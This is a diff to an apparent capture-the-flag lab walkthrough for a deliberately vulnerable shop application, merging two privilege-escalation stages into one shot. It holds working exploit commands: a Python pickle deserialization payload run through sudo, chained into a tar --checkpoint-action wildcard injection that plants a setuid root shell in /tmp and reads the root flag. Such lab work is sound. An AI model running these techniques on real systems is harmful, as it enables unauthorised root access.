@@ -158,29 +158,33 @@ docker compose exec app cat /opt/shop/flags/stage1
 docker compose exec app bash   # (simulates the shell a real payload would give)
 id                              # ordinary appuser, no interesting group
 sudo -l                         # shows exactly one rule -- the only lead
-
-# Stage 11: hop 1, appuser -> opsuser (insecure deserialization, CWE-502)
 cat /opt/shop/scripts/ticket_export.py   # world-readable: pickle.load() on argv[1]
+cat /opt/shop/scripts/backup.sh          # also world-readable: tar wildcard bug
+
+# Stage 11 + 12: hop 1 (appuser -> opsuser, CWE-502 deserialization) chained
+# directly into hop 2 (opsuser -> root, tar wildcard/argument injection,
+# GTFOBins) in a single payload. This has to be one shot: sudo checks the
+# REAL uid, and a setuid shell planted for later reuse only ever carries
+# an *effective* opsuser identity forward -- not enough to pass hop 2's own
+# sudo check (see vulnerable/privilege_escalation/README.md for why).
 python3 -c "
 import pickle, os
+CHAIN_CMD = (
+    'cd /opt/shop/backups/staging && '
+    \"echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh && \"
+    \"touch -- '--checkpoint=1' && \"
+    \"touch -- '--checkpoint-action=exec=sh payload.sh' && \"
+    'sudo /opt/shop/scripts/backup.sh && '
+    'cp /opt/shop/flags/stage2 /tmp/stage2_proof.txt && chmod 644 /tmp/stage2_proof.txt'
+)
 class Exploit:
     def __reduce__(self):
-        return (os.system, ('cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash',))
+        return (os.system, (CHAIN_CMD,))
 with open('/tmp/payload.pkl', 'wb') as f:
     pickle.dump(Exploit(), f)
 "
 sudo -u opsuser /opt/shop/scripts/ticket_export.py /tmp/payload.pkl
-/tmp/opsbash -p -c 'cat /opt/shop/flags/stage2'   # proves the hop
-
-# Stage 12: hop 2, opsuser -> root (tar wildcard/argument injection, GTFOBins)
-/tmp/opsbash -p
-sudo -l                              # now shows the scoped backup.sh rule
-ls -la /opt/shop/scripts/backup.sh   # root:root, 755 -- NOT writable (old bug is fixed)
-cd /opt/shop/backups/staging
-echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh
-touch -- '--checkpoint=1'
-touch -- '--checkpoint-action=exec=sh payload.sh'
-sudo /opt/shop/scripts/backup.sh
+cat /tmp/stage2_proof.txt            # proves the hop 1 -> hop 2 transition
 /tmp/rootbash -p -c 'cat /root/final_flag'
 
 # Stage 13: root
